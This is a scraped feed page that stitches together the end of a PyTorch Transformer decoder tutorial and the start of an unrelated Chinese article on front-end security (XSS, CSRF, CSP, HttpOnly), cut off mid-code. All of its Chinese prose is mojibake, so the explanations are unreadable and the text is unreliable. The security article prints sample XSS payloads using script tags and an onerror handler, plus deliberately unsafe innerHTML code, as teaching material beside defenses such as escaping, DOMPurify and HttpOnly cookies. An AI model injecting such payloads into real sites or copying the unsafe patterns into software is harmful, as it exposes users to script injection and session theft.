<li><code>nhead</code>: å¤šå¤´æ³¨æ„åŠ›çš„å¤´æ•°é‡</li>
<li><code>dim_feedforward</code>: å‰å‘ä¼ æ’­éšè—å±‚æ•°é‡,é»˜è®¤å€¼ä¸º2048</li>
<li><code>batch_first</code>: è¾“å…¥è¾“å‡ºç»´åº¦é¡ºåºï¼Œé»˜è®¤Falseï¼Œä½†ä¸€èˆ¬æƒ…å†µä¸‹å¼ºåˆ¶å…¶ä¸ºTrue</li>
<li><code>dropout</code>: é»˜è®¤ä¸º0.1</li>
<li><code>activation</code>: æ¿€æ´»å‡½æ•°ï¼Œé»˜è®¤ä¸º<code>relu</code>,è¿˜å¯ä»¥ä½¿ç”¨<code>gelu</code>ï¼ˆgeluå¯¹åºåˆ—ä»»åŠ¡è¡¨ç°è¾ƒå¥½ï¼Œä½†æ˜¯è®¡ç®—é‡å¤§ï¼‰</li>
</ul>
<p><strong>è¾“å…¥çŸ©é˜µå½¢çŠ¶ï¼š</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><msub><mi>n</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X = (batch\_ size, seq\_ len_{1}, d\_ model),Y_{out} = (batch\_ size, seq\_len_{2}, d\_ model)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span></span></p>
<pre><code class="hljs language-python" lang="python">decoder_layer = nn.TransformerDecoderLayer(d_model=<span class="hljs-number">12</span>, nhead=<span class="hljs-number">4</span>,batch_first=<span class="hljs-literal">True</span>)
Y_out = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>)
X = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>)   <span class="hljs-comment"># æ³¨æ„ä¸¤ä¸ªåºåˆ—é•¿åº¦å¯ä»¥ä¸ä¸€æ ·</span>
seq_len = <span class="hljs-number">20</span>
mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()  <span class="hljs-comment"># åŠ æ©ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä¸åŠ ï¼Œä¸»è¦çœ‹ä½ çš„ä»»åŠ¡æ˜¯ä»€ä¹ˆ</span>
output = decoder_layer(X, Y_out,tgt_mask=mask)
output.shape	<span class="hljs-comment"># è¾“å‡º(2,20,12)</span>
</code></pre>
<p><strong>a2.4 TransformerDecoder</strong></p>
<p>å¤šä¸ªTransformerDecoderLayerå †å ç»“æ„</p>
<p><strong>åˆå§‹åŒ–å‚æ•°ï¼š</strong></p>
<ul>
<li>
<p><code>encoder_layer</code>: ä¸€ä¸ªTransformerDecoderLayerå±‚å®ä¾‹</p>
</li>
<li>
<p><code>num_layers</code>: å‡ ä¸ªTransformerDecoderLayerå±‚å †å </p>
</li>
</ul>
<p>ä½¿ç”¨æ–¹æ³•å’ŒTransformerEncoderåŒç†ï¼Œä¸åœ¨æ­¤è¿‡å¤šä»‹ç»</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[XSSã€CSRFã€CSPã€HttpOnly å…¨æ‰«ç›²ï¼šå‰ç«¯å®‰å…¨ä¸åªæ˜¯åç«¯çš„äº‹]]></title>    <link>https://juejin.cn/post/7583615094363193398</link>    <guid>https://juejin.cn/post/7583615094363193398</guid>    <pubDate>2025-12-15T08:13:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583615094363193398" data-draft-id="7583845695196790838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="XSSã€CSRFã€CSPã€HttpOnly å…¨æ‰«ç›²ï¼šå‰ç«¯å®‰å…¨ä¸åªæ˜¯åç«¯çš„äº‹"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-15T08:13:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            XSSã€CSRFã€CSPã€HttpOnly å…¨æ‰«ç›²ï¼šå‰ç«¯å®‰å…¨ä¸åªæ˜¯åç«¯çš„äº‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T08:13:58.000Z" title="Mon Dec 15 2025 08:13:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‰ç«¯å®‰å…¨è¿™äº‹ï¼Œå¾ˆå¤šäººè§‰å¾—æ˜¯åç«¯çš„æ´»ï¼Œæˆ–è€…è§‰å¾—è‡ªå·±çš„é¡¹ç›®æ²¡é‚£ä¹ˆé‡è¦ä¸ä¼šè¢«æ”»å‡»ã€‚ä½†ç°å®æ˜¯ï¼ŒXSSã€CSRF è¿™äº›æ¼æ´åœ¨é‡å¤–å¤ªå¸¸è§äº†ï¼Œè€Œä¸”å¾ˆå¤šæ—¶å€™æ”»å‡»è€…å°±æ˜¯ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ‰«çš„ï¼Œä¸æŒ‘é¡¹ç›®å¤§å°ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« æŠŠå‰ç«¯å¸¸è§çš„å®‰å…¨é—®é¢˜æ‹ä¸€éï¼Œæ¯ä¸ªé—®é¢˜è®²æ¸…æ¥šåŸç†ã€æ”»å‡»æ–¹å¼å’Œé˜²æŠ¤æ‰‹æ®µã€‚</p>
<hr/>
<h2 data-id="heading-0">XSSï¼šæœ€å¸¸è§çš„å‰ç«¯æ¼æ´</h2>
<p>XSSï¼ˆCross-Site Scriptingï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰çš„æ ¸å¿ƒå°±æ˜¯æŠŠæ¶æ„è„šæœ¬æ³¨å…¥åˆ°ç½‘é¡µé‡Œï¼Œè®©æµè§ˆå™¨æŠŠå®ƒå½“æ­£å¸¸ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥å· Cookieã€åŠ«æŒä¼šè¯ã€é’“é±¼ã€ç”šè‡³å‘èµ·è •è™«æ”»å‡»ã€‚</p>
<h3 data-id="heading-1">ä¸‰ç§å¸¸è§ç±»å‹</h3>
<p>ä¸‰ç§ XSS çš„æ”»å‡»é“¾è·¯é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph å­˜å‚¨å‹XSS
        A1[æ”»å‡»è€…æäº¤æ¶æ„è¯„è®º] --&gt; A2[æ¶æ„ä»£ç å­˜å…¥æ•°æ®åº“]
        A2 --&gt; A3[ç”¨æˆ·è®¿é—®é¡µé¢]
        A3 --&gt; A4[æœåŠ¡å™¨è¿”å›å«æ¶æ„ä»£ç çš„é¡µé¢]
        A4 --&gt; A5[æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬]
    end

    subgraph åå°„å‹XSS
        B1[æ”»å‡»è€…æ„é€ æ¶æ„URL] --&gt; B2[è¯±å¯¼ç”¨æˆ·ç‚¹å‡»]
        B2 --&gt; B3[æœåŠ¡å™¨å°†å‚æ•°åå°„åˆ°é¡µé¢]
        B3 --&gt; B4[æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬]
    end

    subgraph DOMå‹XSS
        C1[æ”»å‡»è€…æ„é€ æ¶æ„URL] --&gt; C2[è¯±å¯¼ç”¨æˆ·ç‚¹å‡»]
        C2 --&gt; C3[å‰ç«¯JSè¯»å–URLå‚æ•°]
        C3 --&gt; C4[ç›´æ¥æ“ä½œDOMæ’å…¥æ¶æ„ä»£ç ]
        C4 --&gt; C5[æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬]
    end
</code></pre>
<p><strong>å­˜å‚¨å‹ XSS</strong></p>
<p>æ¶æ„ä»£ç è¢«å­˜åˆ°æ•°æ®åº“é‡Œï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šæ‰§è¡Œã€‚æ¯”å¦‚è®ºå›çš„è¯„è®ºåŠŸèƒ½ï¼Œæ”»å‡»è€…æäº¤ä¸€æ¡åŒ…å«æ¶æ„è„šæœ¬çš„è¯„è®ºï¼Œå…¶ä»–ç”¨æˆ·ä¸€çœ‹è¯„è®ºå°±ä¸­æ‹›ã€‚è¿™ç§å±å®³æœ€å¤§ï¼Œå½±å“æ‰€æœ‰è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å±é™©çš„å†™æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderComment</span>(<span class="hljs-params">comment</span>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'comment'</span>).<span class="hljs-property">innerHTML</span> = comment.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>åå°„å‹ XSS</strong></p>
<p>æ¶æ„ä»£ç åœ¨ URL å‚æ•°é‡Œï¼ŒæœåŠ¡å™¨æŠŠå‚æ•°åŸæ ·è¿”å›åˆ°é¡µé¢ã€‚å¸¸è§äºæœç´¢åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>

<span class="hljs-comment">// æœåŠ¡å™¨è¿”å›</span>
&lt;div&gt;æœç´¢ç»“æœï¼š&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">'XSS'</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>div&gt;
</code></pre>
<p>æ”»å‡»è€…éœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ç‰¹å®šé“¾æ¥æ‰èƒ½è§¦å‘ï¼Œä½†ä¼ æ’­æ€§å¾ˆå¼ºï¼Œå¯ä»¥é€šè¿‡é’“é±¼é‚®ä»¶ã€ç¤¾äº¤åª’ä½“ç­‰æ–¹å¼å¤§é‡æ•£æ’­ã€‚</p>
<p><strong>DOM å‹ XSS</strong></p>
<p>çº¯å‰ç«¯çš„é—®é¢˜ï¼Œä¸ç»è¿‡æœåŠ¡å™¨ã€‚ç›´æ¥ç”¨ URL å‚æ•°æ“ä½œ DOMï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com#&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="hljs-keyword">const</span> hash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'output'</span>).<span class="hljs-property">innerHTML</span> = hash;  <span class="hljs-comment">// ä¸­æ‹›äº†</span>
</code></pre>
<h3 data-id="heading-2">é˜²å¾¡ XSS çš„å®Œæ•´æ–¹æ¡ˆ</h3>
<p><strong>1. è¾“å‡ºç¼–ç ï¼ˆæ ¹æ®ä¸Šä¸‹æ–‡é€‰æ‹©ï¼‰</strong></p>
<p>ä¸åŒä½ç½®éœ€è¦ä¸åŒçš„ç¼–ç æ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// HTML ä¸Šä¸‹æ–‡ï¼šè½¬ä¹‰ &amp; &lt; &gt; " '</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHtml</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">const</span> map = {
    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'&amp;amp;'</span>,
    <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'&amp;lt;'</span>,
    <span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'&amp;gt;'</span>,
    <span class="hljs-string">'"'</span>: <span class="hljs-string">'&amp;quot;'</span>,
    <span class="hljs-string">"'"</span>: <span class="hljs-string">'&amp;#x27;'</span>
  };
  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;"']/g</span>, <span class="hljs-function">(<span class="hljs-params">char</span>) =&gt;</span> map[char]);
}

<span class="hljs-comment">// URL å‚æ•°ï¼šä½¿ç”¨ encodeURIComponent</span>
<span class="hljs-keyword">const</span> url = <span class="hljs-string">`https://example.com/search?q=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(userInput)}</span>`</span>;

<span class="hljs-comment">// JavaScript å­—ç¬¦ä¸²ï¼šä½¿ç”¨ JSON.stringify æˆ– Unicode ç¼–ç </span>
<span class="hljs-keyword">const</span> safeStr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userInput);

<span class="hljs-comment">// CSS ä¸Šä¸‹æ–‡ï¼šè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦æˆ–ç¦æ­¢ç”¨æˆ·è¾“å…¥å½±å“æ ·å¼</span>
<span class="hljs-comment">// æœ€å¥½åˆ«è®©ç”¨æˆ·è¾“å…¥ç›´æ¥å½±å“ CSS</span>
</code></pre>
<p>å®é™…ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨</span>
element.<span class="hljs-property">innerHTML</span> = escapeHtml(userInput);
</code></pre>
<p><strong>2. ä½¿ç”¨å®‰å…¨çš„ API</strong></p>
<p>ä¸è¦ç”¨ <code>innerHTML</code>ï¼Œç”¨ <code>textContent</code> æˆ– <code>innerText</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å±é™©</span>
element.<span class="hljs-property">innerHTML</span> = userInput;

<span class="hljs-comment">// å®‰å…¨</span>
element.<span class="hljs-property">textContent</span> = userInput;

<span class="hljs-comment">// Vue/React é‡Œä¹Ÿä¸€æ ·</span>
<span class="hljs-comment">// å±é™©ï¼š&lt;div v-html="userInput"&gt;&lt;/div&gt;</span>
<span class="hljs-comment">// å®‰å…¨ï¼š&lt;div&gt;{{ userInput }}&lt;/div&gt;</span>
</code></pre>
<p>ç°ä»£æ¡†æ¶ï¼ˆReactã€Vueã€Angularï¼‰é»˜è®¤ä¼šåšè½¬ä¹‰ï¼Œä½†è¦æ³¨æ„"é€ƒç”Ÿèˆ±å£"ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// React - å±é™©çš„ API</span>
&lt;div dangerouslySetInnerHTML={{ <span class="hljs-attr">__html</span>: userContent }} /&gt;

<span class="hljs-comment">// Vue - å±é™©çš„æŒ‡ä»¤</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// Angular - å±é™©çš„æ–¹å¼</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> [<span class="hljs-attr">innerHTML</span>]=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// è¿™äº›åœ°æ–¹éœ€è¦æ‰‹åŠ¨å‡€åŒ–</span>
</code></pre>
<p><strong>3. HTML å‡€åŒ–åº“</strong></p>
<p>å¦‚æœå¿…é¡»æ¸²æŸ“å¯Œæ–‡æœ¬ï¼ˆæ¯”å¦‚åšå®¢ã€è®ºå›çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼‰ï¼Œç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcure53%2FDOMPurify" target="_blank" title="https://github.com/cure53/DOMPurify" ref="nofollow noopener noreferrer">DOMPurify</a> æ¸…ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">DOMPurify</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'dompurify'</span>;

<span class="hljs-keyword">const</span> dirty = <span class="hljs-string">'&lt;img src=x onerror=alert("XSS")&gt;'</span>;
<span class="hljs-keyword">const</span> clean = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty);
element.<span class="hljs-property">innerHTML</span> = clean;  <span class="hljs-comment">// å®‰å…¨</span>

<span class="hljs-comment">// é…ç½®å…è®¸çš„æ ‡ç­¾å’Œå±æ€§</span>
<span class="hljs-keyword">const</span> clean2 = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty, {
  <span class="hljs-attr">ALLOWED_TAGS</span>: [<span class="hljs-string">'p'</span>, <span class="hljs-string">'strong'</span>, <span class="hljs-string">'em'</span>, <span class="hljs-string">'a'</span>],
  <span class="hljs-attr">ALLOWED_ATTR</span>: [<span class="hljs-string">'href'</span>, <span class="hljs-string">'title'</span>]
});
</code></pre>
<p>DOMPurify ä¼šç§»é™¤æ‰€æœ‰æ½œåœ¨å±é™©çš„æ ‡ç­¾å’Œå±æ€§ï¼ˆ<code>&lt;script&gt;</code>ã€<code>onerror</code>ã€<code>javascript:</code> ç­‰ï¼‰ï¼ŒåŒæ—¶ä¿ç•™åˆæ³•çš„ HTML ç»“æ„ã€‚</p>
<p><strong>4. HttpOnly Cookie</strong></p>
<p>è®¾ç½® Cookie æ—¶åŠ ä¸Š <code>HttpOnly</code>ï¼ŒJavaScript å°±è¯»ä¸åˆ°ï¼ŒXSS æ”»å‡»ä¹Ÿå·ä¸èµ°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// JavaScript è®¿é—®ä¸åˆ°</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// åªåœ¨ HTTPS ä¸‹å‘é€</span>
